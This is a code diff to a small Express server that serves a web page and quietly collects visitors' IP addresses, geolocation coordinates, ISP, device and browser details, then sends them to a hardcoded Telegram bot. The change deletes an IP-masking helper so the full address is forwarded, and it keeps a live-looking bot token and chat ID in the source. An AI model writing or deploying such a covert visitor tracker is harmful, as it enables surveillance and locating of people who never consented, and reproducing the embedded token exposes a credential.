@@ -4,22 +4,12 @@ const path = require("path");
 const app = express();
 app.use(express.json());
 
-// ⚠️ حط القيم بإيدك هنا
+// ===== CONFIG (حطهم مباشرة زي ما طلبت) =====
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-// ===== HELPERS =====
-function maskIP(ip) {
-  if (!ip) return "unknown";
-  if (ip.includes(".")) {
-    const p = ip.split(".");
-    p[3] = "0";
-    return p.join(".");
-  }
-  return ip;
-}
-
+// ===== SEND TO TELEGRAM =====
 async function sendToTelegram(text) {
   await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -31,27 +21,27 @@ async function sendToTelegram(text) {
   });
 }
 
-// ===== VISIT LOGGER =====
+// ===== VISITOR LOGGER =====
 app.post("/visit", async (req, res) => {
   try {
-    const rawIP =
+    // ===== REAL CLIENT IP (FULL) =====
+    const ip =
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket.remoteAddress;
 
-    const maskedIP = maskIP(rawIP);
-
+    // ===== GEO LOCATION =====
     const geoRes = await fetch(
-      `http://ip-api.com/json/${rawIP}?fields=66846719`
+      `http://ip-api.com/json/${ip}?fields=66846719`
     );
     const geo = await geoRes.json();
 
-    const ua = req.headers["user-agent"] || "unknown";
-    const isMobile = /mobile|android|iphone/i.test(ua);
+    const userAgent = req.headers["user-agent"] || "Unknown";
+    const isMobile = /mobile|android|iphone/i.test(userAgent);
 
-    const log = `
+    const message = `
 🛡️ Visit Log
 ----------------------
-IP: ${maskedIP}
+IP: ${ip}
 Country: ${geo.country}
 City: ${geo.city}
 ISP: ${geo.isp}
@@ -62,7 +52,7 @@ Location: ${geo.lat}, ${geo.lon}
 
 Device: ${isMobile ? "Mobile" : "Desktop"}
 User-Agent:
-${ua}
+${userAgent}
 
 Language: ${req.headers["accept-language"]}
 Referer: ${req.headers["referer"] || "Direct"}
@@ -71,19 +61,20 @@ Time: ${new Date().toLocaleString()}
 ----------------------
 `;
 
-    await sendToTelegram(log);
+    await sendToTelegram(message);
     res.json({ logged: true });
-  } catch (e) {
-    console.error(e);
+  } catch (err) {
+    console.error(err);
     res.status(500).json({ error: "failed" });
   }
 });
 
-// ===== SERVE YOUR HTML =====
+// ===== SERVE HTML =====
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
+// ===== START SERVER =====
 app.listen(PORT, () => {
   console.log(`Running on http://localhost:${PORT}`);
 });
